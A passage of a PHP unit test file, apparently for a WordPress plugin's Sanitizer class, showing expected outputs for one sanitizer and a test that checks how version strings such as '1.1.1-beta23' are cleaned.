            'axdextomorrow 200 200 peter',
            'this is true',
            'single-review full-width alert69',
            'mattwordpress.org',
            'httpswordpress.org',
            'wordpress.org',
            'www.wordpress.org',
            'httpswordpress.org',
            '-1',
            'Hello this is a link and a link',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            'Łukasz',
            'မောင်မောင် အောင်မျိုး ကိုကိုဦး မိုးမြင့်သန္တာ',
        ]);
    }

    public function test_sanitize_version()
    {
        $values = $this->testValues;
        $values[] = 'v1.1.1';
        $values[] = 'v1';
        $values[] = '1.1.1.1';
        $values[] = '1.1.1';
        $values[] = '1.1.1a';
        $values[] = '1.1.beta';
        $values[] = '1.1.beta23';
        $values[] = '1.1..1beta23';
        $values[] = '1.1.1beta23';
        $values[] = '1.1.1-beta23';
        $values[] = '1.1.1-beta.1';
        $sanitized = $this->sanitize('version', $values);
        $this->assertEquals($sanitized, [
            '',
            '',
            '1',
            '',
            '13',
            '0',
            '13',
            '',
            '1',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '2020',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '1.1.1',
            '',
            '',
            '',
            '',
            '',
            '1.1.1-beta23',
            '1.1.1-beta.1',
        ]);
    }

    protected function sanitize(string $sanitizer, array $values = [])
    {
        if (empty($values)) {
            $values = $this->testValues;
        }
        $sanitizers = array_fill_keys(array_keys($values), $sanitizer);
        return (new Sanitizer($values, $sanitizers))->run();
    }
}
